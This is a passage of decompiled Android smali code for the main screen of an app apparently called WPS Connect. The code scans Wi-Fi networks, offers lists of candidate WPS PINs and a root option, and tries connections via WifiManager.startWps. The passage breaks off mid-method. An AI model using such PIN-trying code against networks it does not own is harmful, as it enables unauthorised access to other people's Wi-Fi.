.class public Lcom/ngb/wpsconnect/MainActivity;
.super Landroid/support/v7/a/d;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/ngb/wpsconnect/MainActivity$a;,
        Lcom/ngb/wpsconnect/MainActivity$b;
    }
.end annotation


# static fields
.field protected static A:Z

.field protected static B:Z

.field protected static C:Z

.field protected static m:Landroid/net/wifi/WifiManager;

.field protected static w:Z

.field protected static x:Z

.field protected static y:Z


# instance fields
.field protected D:Z

.field protected E:Ljava/lang/String;

.field protected F:Ljava/lang/String;

.field protected G:Ljava/lang/String;

.field protected H:Ljava/lang/String;

.field protected I:Ljava/lang/String;

.field private final J:I

.field protected n:Lcom/ngb/wpsconnect/MainActivity$b;

.field protected o:Landroid/widget/ListView;

.field protected p:Landroid/widget/TextView;

.field protected q:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Lcom/ngb/wpsconnect/b;",
            ">;"
        }
    .end annotation
.end field

.field protected r:Landroid/widget/ArrayAdapter;

.field protected final s:Landroid/content/Context;

.field protected t:Landroid/content/Intent;

.field protected u:Ljava/lang/String;

.field protected v:I

.field protected z:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->y:Z

    sput-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->A:Z

    sput-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->B:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->C:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Landroid/support/v7/a/d;-><init>()V

    iput-object p0, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    const/16 v0, 0x64

    iput v0, p0, Lcom/ngb/wpsconnect/MainActivity;->J:I

    iput v1, p0, Lcom/ngb/wpsconnect/MainActivity;->v:I

    iput-boolean v1, p0, Lcom/ngb/wpsconnect/MainActivity;->z:Z

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->D:Z

    return-void
.end method

.method private a(Ljava/lang/String;)I
    .locals 1

    const-string v0, "WPA2"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "WPA"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "WEP"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const v0, 0x7f020078

    :goto_0
    return v0

    :cond_1
    const v0, 0x7f020079

    goto :goto_0
.end method

.method static synthetic a(Lcom/ngb/wpsconnect/MainActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->t()V

    return-void
.end method

.method static synthetic a(Lcom/ngb/wpsconnect/MainActivity;Lcom/ngb/wpsconnect/b;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/ngb/wpsconnect/MainActivity;->a(Lcom/ngb/wpsconnect/b;)V

    return-void
.end method

.method static synthetic a(Lcom/ngb/wpsconnect/MainActivity;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/ngb/wpsconnect/MainActivity;->b(Ljava/lang/String;)V

    return-void
.end method

.method private a(Lcom/ngb/wpsconnect/b;)V
    .locals 8

    const/4 v7, 0x0

    new-instance v1, Landroid/support/v7/a/c$a;

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-direct {v1, v0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1}, Lcom/ngb/wpsconnect/b;->b()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->E:Ljava/lang/String;

    invoke-virtual {p1}, Lcom/ngb/wpsconnect/b;->a()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->F:Ljava/lang/String;

    invoke-static {p1}, Lcom/ngb/wpsconnect/a;->a(Lcom/ngb/wpsconnect/b;)[Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lcom/ngb/wpsconnect/MainActivity;->F:Ljava/lang/String;

    invoke-static {}, La/a/a/b$b;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x15

    if-lt v0, v4, :cond_0

    const v0, 0x7f040036

    const/4 v4, 0x0

    invoke-static {p0, v0, v4}, Landroid/view/View;->inflate(Landroid/content/Context;ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v4

    const v0, 0x7f0d00a8

    invoke-virtual {v4, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/CheckBox;

    new-instance v5, Lcom/ngb/wpsconnect/MainActivity$14;

    invoke-direct {v5, p0, v0}, Lcom/ngb/wpsconnect/MainActivity$14;-><init>(Lcom/ngb/wpsconnect/MainActivity;Landroid/widget/CheckBox;)V

    invoke-virtual {v0, v5}, Landroid/widget/CheckBox;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    const v5, 0x7f070066

    invoke-virtual {p0, v5}, Lcom/ngb/wpsconnect/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/widget/CheckBox;->setText(Ljava/lang/CharSequence;)V

    invoke-virtual {p0, v7}, Lcom/ngb/wpsconnect/MainActivity;->getPreferences(I)Landroid/content/SharedPreferences;

    move-result-object v5

    const-string v6, "useRoot"

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    sput-boolean v5, Lcom/ngb/wpsconnect/MainActivity;->A:Z

    invoke-virtual {v0, v5}, Landroid/widget/CheckBox;->setChecked(Z)V

    invoke-virtual {v1, v4}, Landroid/support/v7/a/c$a;->b(Landroid/view/View;)Landroid/support/v7/a/c$a;

    :cond_0
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-static {v0, v2}, Ljava/util/Collections;->addAll(Ljava/util/Collection;[Ljava/lang/Object;)Z

    new-instance v4, Landroid/widget/ArrayAdapter;

    const v5, 0x109000f

    invoke-direct {v4, p0, v5, v0}, Landroid/widget/ArrayAdapter;-><init>(Landroid/content/Context;ILjava/util/List;)V

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->t:Landroid/content/Intent;

    const-string v5, "List_Position"

    invoke-virtual {v0, v5, v7}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    new-instance v5, Lcom/ngb/wpsconnect/MainActivity$15;

    invoke-direct {v5, p0}, Lcom/ngb/wpsconnect/MainActivity$15;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v1, v4, v0, v5}, Landroid/support/v7/a/c$a;->a(Landroid/widget/ListAdapter;ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const v0, 0x7f070044

    new-instance v4, Lcom/ngb/wpsconnect/MainActivity$16;

    invoke-direct {v4, p0}, Lcom/ngb/wpsconnect/MainActivity$16;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v1, v0, v4}, Landroid/support/v7/a/c$a;->b(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const v0, 0x7f07003c

    new-instance v4, Lcom/ngb/wpsconnect/MainActivity$17;

    invoke-direct {v4, p0, v3}, Lcom/ngb/wpsconnect/MainActivity$17;-><init>(Lcom/ngb/wpsconnect/MainActivity;Ljava/lang/String;)V

    invoke-virtual {v1, v0, v4}, Landroid/support/v7/a/c$a;->c(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const v0, 0x7f07003d

    new-instance v4, Lcom/ngb/wpsconnect/MainActivity$18;

    invoke-direct {v4, p0, v2, v3}, Lcom/ngb/wpsconnect/MainActivity$18;-><init>(Lcom/ngb/wpsconnect/MainActivity;[Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v1, v0, v4}, Landroid/support/v7/a/c$a;->a(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    invoke-virtual {v1, v7}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    const v0, 0x7f070045

    invoke-virtual {v1, v0}, Landroid/support/v7/a/c$a;->a(I)Landroid/support/v7/a/c$a;

    invoke-virtual {v1}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    invoke-virtual {v1}, Landroid/support/v7/a/c$a;->c()Landroid/support/v7/a/c;

    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    const/4 v3, 0x1

    if-eqz p1, :cond_0

    if-nez p2, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    if-nez v0, :cond_2

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "wifi"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    sput-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    :cond_2
    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager;->isWifiEnabled()Z

    move-result v0

    if-nez v0, :cond_3

    const v0, 0x7f07004f

    const/4 v1, 0x0

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0, v3}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    :cond_3
    const-string v0, "connectivity"

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getType()I

    move-result v2

    if-ne v2, v3, :cond_4

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v1

    if-eqz v1, :cond_4

    sget-object v1, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v1}, Landroid/net/wifi/WifiManager;->getConnectionInfo()Landroid/net/wifi/WifiInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/net/wifi/WifiInfo;->getBSSID()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_4

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->m()Z

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->u()V

    goto :goto_0

    :cond_4
    new-instance v1, Landroid/app/ProgressDialog;

    iget-object v2, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-direct {v1, v2}, Landroid/app/ProgressDialog;-><init>(Landroid/content/Context;)V

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$10;

    invoke-direct {v2, p0, v1, v0}, Lcom/ngb/wpsconnect/MainActivity$10;-><init>(Lcom/ngb/wpsconnect/MainActivity;Landroid/app/ProgressDialog;Landroid/net/ConnectivityManager;)V

    new-instance v0, Landroid/net/wifi/WpsInfo;

    invoke-direct {v0}, Landroid/net/wifi/WpsInfo;-><init>()V

    const/4 v1, 0x2

    iput v1, v0, Landroid/net/wifi/WpsInfo;->setup:I

    iput-object p2, v0, Landroid/net/wifi/WpsInfo;->pin:Ljava/lang/String;

    iput-object p1, v0, Landroid/net/wifi/WpsInfo;->BSSID:Ljava/lang/String;

    sget-object v1, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v1, v0, v2}, Landroid/net/wifi/WifiManager;->startWps(Landroid/net/wifi/WpsInfo;Landroid/net/wifi/WifiManager$WpsCallback;)V

    goto :goto_0
.end method

.method private static a(Landroid/content/Context;)Z
    .locals 4

    const/4 v0, 0x1

    const/4 v1, 0x0

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x13

    if-lt v2, v3, :cond_2

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "location_mode"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;)I
    :try_end_0
    .catch Landroid/provider/Settings$SettingNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    :goto_0
    if-eqz v2, :cond_1

    :cond_0
    :goto_1
    return v0

    :catch_0
    move-exception v2

    invoke-virtual {v2}, Landroid/provider/Settings$SettingNotFoundException;->printStackTrace()V

    move v2, v1

    goto :goto_0

    :cond_1
    move v0, v1

    goto :goto_1

    :cond_2
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "location_providers_allowed"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    move v0, v1

    goto :goto_1
.end method

.method private b(I)I
    .locals 1

    const/4 v0, 0x4

    invoke-static {p1, v0}, Landroid/net/wifi/WifiManager;->calculateSignalLevel(II)I

    move-result v0

    packed-switch v0, :pswitch_data_0

    const/4 v0, -0x1

    :goto_0
    return v0

    :pswitch_0
    const v0, 0x7f02007a

    goto :goto_0

    :pswitch_1
    const v0, 0x7f02007b

    goto :goto_0

    :pswitch_2
    const v0, 0x7f02007c

    goto :goto_0

    :pswitch_3
    const v0, 0x7f02007d

    goto :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method

.method static synthetic b(Lcom/ngb/wpsconnect/MainActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->v()V

    return-void
.end method

.method private b(Ljava/lang/String;)V
    .locals 6

    const/4 v3, 0x1

    const/4 v5, 0x0

    new-instance v0, Landroid/support/v7/a/c$a;

    iget-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Lcom/ngb/wpsconnect/MainActivity;->F:Ljava/lang/String;

    new-instance v1, Landroid/widget/EditText;

    iget-object v2, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-direct {v1, v2}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x2

    invoke-virtual {v1, v2}, Landroid/widget/EditText;->setInputType(I)V

    invoke-virtual {v1, v3}, Landroid/widget/EditText;->setMaxLines(I)V

    new-array v2, v3, [Landroid/text/InputFilter;

    new-instance v3, Landroid/text/InputFilter$LengthFilter;

    const/16 v4, 0x8

    invoke-direct {v3, v4}, Landroid/text/InputFilter$LengthFilter;-><init>(I)V

    aput-object v3, v2, v5

    invoke-virtual {v1, v2}, Landroid/widget/EditText;->setFilters([Landroid/text/InputFilter;)V

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(Landroid/view/View;)Landroid/support/v7/a/c$a;

    const v2, 0x7f070053

    invoke-virtual {v0, v2}, Landroid/support/v7/a/c$a;->a(I)Landroid/support/v7/a/c$a;

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    const v2, 0x7f070044

    new-instance v3, Lcom/ngb/wpsconnect/MainActivity$2;

    invoke-direct {v3, p0}, Lcom/ngb/wpsconnect/MainActivity$2;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v2, v3}, Landroid/support/v7/a/c$a;->b(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const v2, 0x7f07003d

    new-instance v3, Lcom/ngb/wpsconnect/MainActivity$3;

    invoke-direct {v3, p0, v1, p1}, Lcom/ngb/wpsconnect/MainActivity$3;-><init>(Lcom/ngb/wpsconnect/MainActivity;Landroid/widget/EditText;Ljava/lang/String;)V

    invoke-virtual {v0, v2, v3}, Landroid/support/v7/a/c$a;->a(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    invoke-virtual {v0, v5}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->c()Landroid/support/v7/a/c;

    return-void
.end method

.method static synthetic c(Lcom/ngb/wpsconnect/MainActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->u()V

    return-void
.end method

.method private n()V
    .locals 3

    iget-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->D:Z

    if-eqz v0, :cond_0

    new-instance v0, Landroid/support/v7/a/c$a;

    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$1;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$1;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->a(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    move-result-object v0

    const v1, 0x7f070051

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(I)Landroid/support/v7/a/c$a;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c;->show()V

    :cond_0
    return-void
.end method

.method private o()V
    .locals 4

    const/4 v3, 0x0

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-ge v0, v1, :cond_1

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->n()V

    sput-boolean v3, Lcom/ngb/wpsconnect/MainActivity;->B:Z

    :cond_0
    :goto_0
    return-void

    :cond_1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->B:Z

    const-string v0, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {p0, v0}, Landroid/support/v4/b/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Landroid/support/v7/a/c$a;

    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$11;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$11;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->a(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    invoke-virtual {v0, v3}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    const v1, 0x7f070060

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(I)Landroid/support/v7/a/c$a;

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c;->show()V

    const v1, 0x102000b

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    invoke-static {}, Landroid/text/method/LinkMovementMethod;->getInstance()Landroid/text/method/MovementMethod;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setMovementMethod(Landroid/text/method/MovementMethod;)V

    goto :goto_0
.end method

.method private p()V
    .locals 3

    new-instance v0, Landroid/support/v7/a/c$a;

    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$12;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$12;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->a(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    const v1, 0x7f07005f

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(I)Landroid/support/v7/a/c$a;

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c;->show()V

    return-void
.end method

.method private q()V
    .locals 3

    const v0, 0x7f04001b

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->setContentView(I)V

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->x()V

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "List_Position"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v0

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->t:Landroid/content/Intent;

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-static {v0}, Lcom/ngb/wpsconnect/a;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->u:Ljava/lang/String;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->q:Ljava/util/ArrayList;

    new-instance v1, Lcom/ngb/wpsconnect/c;

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->q:Ljava/util/ArrayList;

    invoke-direct {v1, p0, v0}, Lcom/ngb/wpsconnect/c;-><init>(Landroid/app/Activity;Ljava/util/ArrayList;)V

    iput-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->r:Landroid/widget/ArrayAdapter;

    const v0, 0x7f0d0085

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ListView;

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->o:Landroid/widget/ListView;

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->o:Landroid/widget/ListView;

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setAdapter(Landroid/widget/ListAdapter;)V

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->o:Landroid/widget/ListView;

    new-instance v1, Lcom/ngb/wpsconnect/MainActivity$13;

    invoke-direct {v1, p0}, Lcom/ngb/wpsconnect/MainActivity$13;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setOnItemClickListener(Landroid/widget/AdapterView$OnItemClickListener;)V

    const v0, 0x7f0d0084

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->p:Landroid/widget/TextView;

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->r()V

    return-void
.end method

.method private r()V
    .locals 3

    const/4 v2, 0x0

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "wifi"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    sput-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    new-instance v0, Lcom/ngb/wpsconnect/MainActivity$b;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/ngb/wpsconnect/MainActivity$b;-><init>(Lcom/ngb/wpsconnect/MainActivity;Lcom/ngb/wpsconnect/MainActivity$1;)V

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->n:Lcom/ngb/wpsconnect/MainActivity$b;

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager;->isWifiEnabled()Z

    move-result v0

    if-nez v0, :cond_0

    const v0, 0x7f07004f

    invoke-static {p0, v0, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    :cond_0
    sput-boolean v2, Lcom/ngb/wpsconnect/MainActivity;->x:Z

    sput-boolean v2, Lcom/ngb/wpsconnect/MainActivity;->w:Z

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->n:Lcom/ngb/wpsconnect/MainActivity$b;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.net.wifi.SCAN_RESULTS"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/ngb/wpsconnect/MainActivity;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method

.method private s()V
    .locals 2

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ngb/wpsconnect/AboutActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method private t()V
    .locals 3

    new-instance v0, Landroid/support/v7/a/c$a;

    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005a

    invoke-virtual {p0, v1}, Lcom/ngb/wpsconnect/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(Ljava/lang/CharSequence;)Landroid/support/v7/a/c$a;

    move-result-object v0

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$4;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$4;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->b(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c;->show()V

    const v1, 0x102000b

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    invoke-static {}, Landroid/text/method/LinkMovementMethod;->getInstance()Landroid/text/method/MovementMethod;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setMovementMethod(Landroid/text/method/MovementMethod;)V

    return-void
.end method

.method private u()V
    .locals 3

    new-instance v0, Landroid/support/v7/a/c$a;

